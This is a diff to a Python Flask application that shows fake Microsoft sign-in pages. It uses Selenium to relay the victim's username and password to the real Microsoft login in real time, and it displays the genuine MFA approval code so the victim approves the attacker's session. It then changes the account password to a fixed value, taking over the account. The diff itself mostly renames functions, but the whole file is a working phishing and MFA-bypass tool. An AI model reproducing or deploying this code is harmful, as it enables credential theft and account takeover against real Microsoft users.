@@ -12,40 +12,43 @@ from selenium.webdriver.common.keys import Keys
 import os
 
 def WEB_DRIVER_NAME(): return "geckodriver.exe"
-def NEW_PASSWORD(): return "a" * 8
 def WEB_DRIVER_PATH(): return os.path.join(os.getcwd(), WEB_DRIVER_NAME())
 def WEB_DRIVER_SERVICE(): return Service(executable_path = WEB_DRIVER_PATH())
 
-def NAME_PAGE(form): return render_template("login.html", title="Fake sign in", header="Fake sign in", form=form)
-def PASSWORD_PAGE(form): return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", form=form)
-def AUTHENTICATION_PAGE(authentication_code): return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
-def INDEX_PAGE(): return render_template("index.html", title="Fake Apps", header="Fake dashboard", name=session["name"])
+def MIN_PASSWORD_LENGTH(): return 8
+def REPEATED_CHARACTER(): return "a"
+def NEW_PASSWORD(): return REPEATED_CHARACTER() * MIN_PASSWORD_LENGTH()
+
+def NamePage(form): return render_template("login.html", title="Fake sign in", header="Fake sign in", form=form)
+def PasswordPage(form): return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", form=form)
+def AuthenticationPage(authentication_code): return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
+def IndexPage(): return render_template("index.html", title="Fake Apps", header="Fake dashboard", name=session["name"])
 
 session_count = 0
 drivers = []
-def driver(): return drivers[session["id"]]
+def Driver(): return drivers[session["id"]]
 
 def change_password():
-    driver().get("https://mysignins.microsoft.com/security-info/password/change")
-    new_password_field = WebDriverWait(driver(), 60).until(EC.presence_of_element_located((By.NAME, "newPassword")))
-    confirm_password_field = driver().find_element(By.NAME, "newPasswordConfirm")
+    Driver().get("https://mysignins.microsoft.com/security-info/password/change")
+    new_password_field = WebDriverWait(Driver(), 60).until(EC.presence_of_element_located((By.NAME, "newPassword")))
+    confirm_password_field = Driver().find_element(By.NAME, "newPasswordConfirm")
 
     new_password_field.send_keys(NEW_PASSWORD())
     confirm_password_field.send_keys(NEW_PASSWORD())
 
-    submit_button = driver().find_element(By.CSS_SELECTOR, "[aria-label=Submit]")
+    submit_button = Driver().find_element(By.CSS_SELECTOR, "[aria-label=Submit]")
     submit_button.click()
 
     session["password_changed"] = True
 
 def get_authentication_code():
     try:
-        authentication_code = WebDriverWait(driver(), 5).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
+        authentication_code = WebDriverWait(Driver(), 5).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
         return authentication_code.text
 
     except:
         try:
-            resend_request = WebDriverWait(driver(), 5).until(EC.presence_of_element_located((By.ID, "idA_SAASDS_Resend")))
+            resend_request = WebDriverWait(Driver(), 5).until(EC.presence_of_element_located((By.ID, "idA_SAASDS_Resend")))
             resend_request.click()
             return get_authentication_code()
 
@@ -53,11 +56,11 @@ def get_authentication_code():
             return False
 
 def enter_field(field_name, value, error_id, clear):
-    field = WebDriverWait(driver(), 60).until(EC.visibility_of_element_located((By.NAME, field_name)))
+    field = WebDriverWait(Driver(), 60).until(EC.visibility_of_element_located((By.NAME, field_name)))
     field.send_keys(value, Keys.RETURN)
 
     try:
-        error = WebDriverWait(driver(), 5).until(EC.presence_of_element_located((By.ID, error_id)))
+        error = WebDriverWait(Driver(), 5).until(EC.presence_of_element_located((By.ID, error_id)))
 
         if clear:
             field.clear()
@@ -76,7 +79,7 @@ def enter_password(password):
 @app.route("/")
 def index():
     if "name" in session and "password" in session and session["password_changed"]:
-        return INDEX_PAGE()
+        return IndexPage()
 
     return redirect(url_for("login"))
 
@@ -91,7 +94,7 @@ def login():
         session["password_changed"] = False
 
         drivers.append(webdriver.Firefox(service = WEB_DRIVER_SERVICE()))
-        driver().get("https://myapps.microsoft.com")
+        Driver().get("https://myapps.microsoft.com")
 
     name_form = NameForm()
     password_form = PasswordForm()
@@ -102,29 +105,29 @@ def login():
     elif "name" not in session:
         if name_form.validate_on_submit() and enter_name(name_form.name.data):
             session["name"] = name_form.name.data
-            return PASSWORD_PAGE(password_form)
+            return PasswordPage(password_form)
     
-        return NAME_PAGE(name_form)
+        return NamePage(name_form)
 
     elif "password" not in session:
         if password_form.validate_on_submit() and enter_password(password_form.password.data):
             session["password"] = password_form.password.data
             return redirect(url_for("login"))
 
-        return PASSWORD_PAGE(password_form)
+        return PasswordPage(password_form)
 
     elif "password" in session:
         authentication_code = get_authentication_code()
         if authentication_code:
-            return AUTHENTICATION_PAGE(authentication_code)
+            return AuthenticationPage(authentication_code)
 
         elif not session["password_changed"]:
             change_password()
 
         try:
-            WebDriverWait(driver(), 4).until(EC.presence_of_element_located((By.NAME, "Wait until password changes")))
+            WebDriverWait(Driver(), 10).until(EC.presence_of_element_located((By.NAME, "Wait until password changes")))
 
         except:
-            driver().quit()
+            Driver().quit()
 
         return redirect(url_for("index"))
